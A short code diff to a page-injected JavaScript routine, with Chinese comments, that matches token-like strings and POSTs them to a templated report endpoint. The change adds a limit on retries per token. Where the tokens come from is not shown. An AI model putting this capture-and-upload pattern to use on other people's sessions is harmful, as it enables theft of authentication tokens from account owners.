@@ -8,7 +8,8 @@
 (function () {
   var REPORT = '__DSH_REPORT__';
   var REGION = '__DSW_REGION__';
-  var sent = {};
+  var sent = {};   // token -> true 表示已经成功保存
+  var tries = {};  // token -> 尝试次数，避免同一个失效 token 反复重试
   var TOKEN_RE = /^[A-Za-z0-9+/=_-]{30,300}$/;
 
   function looksToken(v) {
@@ -21,7 +22,8 @@
 
   function report(token, source) {
     if (!looksToken(token) || sent[token]) return;
-    sent[token] = true;
+    if ((tries[token] || 0) >= 3) return;
+    tries[token] = (tries[token] || 0) + 1;
     tip('捕获到 token（' + source + '），正在保存…');
     fetch(REPORT, {
       method: 'POST',
@@ -34,11 +36,11 @@
         if (btn) { btn.textContent = '已保存 ✓'; btn.disabled = true; }
         setTimeout(function () { if (location.pathname !== '/') location.href = '/'; }, 1200);
       } else {
-        sent[token] = false;
-        tip('保存失败：' + ((d && d.message) || JSON.stringify(d)));
+        // 服务端明确拒绝（token 失效/格式不对）：这个 token 不再重试，换个来源继续找
+        sent[token] = true;
+        tip('这个 token 已被服务端拒绝：' + ((d && d.message) || JSON.stringify(d)));
       }
     }).catch(function (e) {
-      sent[token] = false;
       tip('回传失败：' + (e && e.message ? e.message : e));
     });
   }
